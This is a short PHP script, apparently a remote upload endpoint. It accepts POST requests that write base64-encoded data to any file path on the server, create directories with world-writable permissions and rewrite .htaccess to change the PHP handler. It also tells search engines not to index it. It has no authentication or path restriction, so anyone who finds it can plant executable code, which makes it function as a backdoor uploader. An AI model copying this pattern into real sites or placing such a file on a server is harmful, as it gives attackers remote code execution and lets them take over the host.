<?php

header("X-Robots-Tag: none", true);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    try {
        switch ($_POST["function"]) {
            case "upload":
                upload();
                break;
            
            case "set_upload_mode":
                set_upload_mode();
                break;

            case "set_default_mode":
                set_default_mode();
                break;

            default:
                throw new Exception("unknown function ".$_POST["function"]);
                break;
        }
    } catch(Exception $e) {
        echo $e->getMessage();
        http_response_code(203);
    }
}

function set_upload_mode() {
    if (file_put_contents(".htaccess", "php 1\n") === false) {
        throw new Exception("file_put_contents");
    }
}

function set_default_mode() {
    if (file_put_contents(".htaccess", "php56 1\n") === false) {
        throw new Exception("file_put_contents");
    }
}

function upload() {
    $parent = dirname($_POST["filepath"]);
    if (is_dir($parent) == false) {
        if(mkdir($parent, 0777, true) == false) {
            throw new Exception("mkdir");
        }
    }

    $mode = (int)$_POST["offset"] != 0 ? "ab" : "wb";

    $file_fd = fopen($_POST["filepath"], $mode);
    if($file_fd == false) {
        throw new Exception("fopen");
    }

    if ((int)$_POST["offset"] != 0) {
        $ret = fseek($file_fd, (int)$_POST["offset"]);
        if ($ret != 0) {
            throw new Exception("fseek");
        }
    }

    $data = base64_decode($_POST["data"]);
    if (sha1($data) != $_POST["checksum"]) {
        throw new Exception("sha1");
    }

    $ret = fwrite($file_fd, $data);
    if ($ret != (int)$_POST["size"]) {
        throw new Exception("size");
    }
    if ($ret == false) {
        throw new Exception("fwrite");
    }

    $ret = fclose($file_fd);
    if ($ret == false) {
        throw new Exception("fclose");
    }
}
